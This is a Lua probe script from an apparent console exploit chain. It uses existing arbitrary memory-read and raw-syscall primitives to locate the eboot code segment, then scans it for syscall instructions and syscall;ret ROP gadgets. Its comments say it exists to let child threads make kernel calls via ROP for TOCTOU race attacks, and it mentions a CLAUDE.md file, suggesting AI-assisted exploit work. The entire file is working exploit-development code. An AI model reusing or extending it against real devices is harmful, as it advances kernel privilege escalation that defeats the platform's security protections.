-- CRASH_CLASS: LOW
-- PROBE 56s: Eboot .text byte scan for syscall instruction (0F 05)
--
-- CLAUDE.md claims "no syscall;ret gadget" but the 1.5MB scan was for
-- mov eax,N;ret patterns (rax gadgets), not for the 0F 05 opcode.
-- If syscall;ret (0F 05 C3) exists in eboot, child threads can make
-- kernel calls via ROP, enabling TOCTOU race conditions.
--
-- Method: Read eboot .text in dword chunks, extract bytes, find all
-- 0F 05 occurrences. Report offset + surrounding bytes for each hit.

print("=== PROBE 56s: EBOOT SYSCALL SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base + text size
local ib = memory.alloc(0x200)
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)

local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end

local szlo = rd(N(ib) + 0x110) or 0
local szhi = rd(N(ib) + 0x114) or 0
if szlo < 0 then szlo = szlo + 0x100000000 end
if szhi < 0 then szhi = szhi + 0x100000000 end

local text_size = szlo  -- text is < 4GB, hi should be 0
print(string.format("eboot_text=0x%X%08X  size=0x%X", thi, tlo, text_size))

if text_size == 0 then
    print("WARNING: zero text size, using 1.5MB default")
    text_size = 0x180000
elseif text_size > 0x800000 then
    print("WARNING: text > 8MB, capping")
    text_size = 0x800000
end

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

-- Extract bytes from a dword (little-endian)
local function dw_bytes(d)
    if d < 0 then d = d + 0x100000000 end
    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256
    return b0, b1, b2, b3
end

-- ===== Scan for 0F 05 (syscall) =====
print("")
print("scanning " .. text_size .. " bytes...")

local hits = {}
local CHUNK = 0x4000  -- 16KB per chunk
local prev_b3 = nil   -- last byte of previous dword for boundary check

for chunk_off = 0, text_size - 4, CHUNK do
    local chunk_end = math.min(chunk_off + CHUNK - 4, text_size - 4)

    for off = chunk_off, chunk_end, 4 do
        local d = rd(N(eaddr(off)))
        if d then
            local b0, b1, b2, b3 = dw_bytes(d)

            -- Check boundary: prev dword's last byte + this dword's first byte
            if prev_b3 == 0x0F and b0 == 0x05 then
                hits[#hits + 1] = off - 1
            end

            -- Check within this dword: positions 0-1, 1-2, 2-3
            if b0 == 0x0F and b1 == 0x05 then hits[#hits + 1] = off end
            if b1 == 0x0F and b2 == 0x05 then hits[#hits + 1] = off + 1 end
            if b2 == 0x0F and b3 == 0x05 then hits[#hits + 1] = off + 2 end

            prev_b3 = b3
        else
            prev_b3 = nil
        end
    end

    -- GC between chunks to avoid OOM
    collectgarbage("collect")

    -- Progress every 256KB
    if chunk_off % 0x40000 == 0 and chunk_off > 0 then
        print(string.format("  scanned 0x%X / 0x%X ...", chunk_off, text_size))
        if not alive() then print("DEAD mid-scan"); return end
    end
end

print(string.format("  scan complete: %d hits", #hits))
print("")

-- ===== Report each hit with context =====
if #hits == 0 then
    print("NO syscall instruction (0F 05) found in eboot .text")
    print("The 'no syscall;ret' claim is CONFIRMED")
else
    print(string.format("FOUND %d syscall instructions:", #hits))
    print("")

    for i, off in ipairs(hits) do
        -- Read 8 bytes starting from the hit (2 dwords)
        local d1 = rd(N(eaddr(off))) or 0
        local d2 = rd(N(eaddr(off + 4))) or 0
        local b = {}
        local a, c, e, f = dw_bytes(d1)
        b[1] = a; b[2] = c; b[3] = e; b[4] = f
        a, c, e, f = dw_bytes(d2)
        b[5] = a; b[6] = c; b[7] = e; b[8] = f

        -- Find the 0F 05 within these bytes
        local rel = 0
        for j = 1, 7 do
            if b[j] == 0x0F and b[j+1] == 0x05 then
                rel = j - 1
                break
            end
        end

        -- What follows the syscall?
        local after1 = b[rel + 3] or 0
        local after2 = b[rel + 4] or 0

        local tag = ""
        if after1 == 0xC3 then
            tag = " *** syscall;ret ***"
        elseif after1 == 0x90 and after2 == 0xC3 then
            tag = " syscall;nop;ret"
        elseif after1 == 0x48 and after2 == 0x3D then
            tag = " syscall;cmp rax,imm (libc pattern)"
        end

        -- Format context bytes
        local ctx = {}
        for j = 1, 8 do
            ctx[j] = string.format("%02X", b[j])
        end

        print(string.format("  [%d] eboot+0x%06X: %s%s",
            i, off, table.concat(ctx, " "), tag))
    end

    -- Summary
    print("")
    local syscall_ret = 0
    for _, off in ipairs(hits) do
        local d = rd(N(eaddr(off + 2))) or 0
        local b0 = dw_bytes(d)
        -- The byte at off+2 is what follows 0F 05
        -- But we need to be more precise: read byte at off+2
        -- off+2 might not be dword-aligned, read the containing dword
        local dw_off = off + 2 - (off + 2) % 4
        local dd = rd(N(eaddr(dw_off))) or 0
        local _, _, _, _ = dw_bytes(dd)
        local byte_idx = (off + 2) % 4
        local following
        if byte_idx == 0 then following = dd % 256
        elseif byte_idx == 1 then following = math.floor(dd / 256) % 256
        elseif byte_idx == 2 then following = math.floor(dd / 65536) % 256
        else following = math.floor(dd / 16777216) % 256
        end
        if following == 0xC3 then syscall_ret = syscall_ret + 1 end
    end

    if syscall_ret > 0 then
        print(string.format("*** %d syscall;ret GADGETS FOUND ***", syscall_ret))
        print("Child threads CAN make kernel calls via ROP!")
    else
        print("No syscall;ret — all hits have different continuations")
        print("Child threads still cannot directly syscall from ROP")
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56s COMPLETE ===")
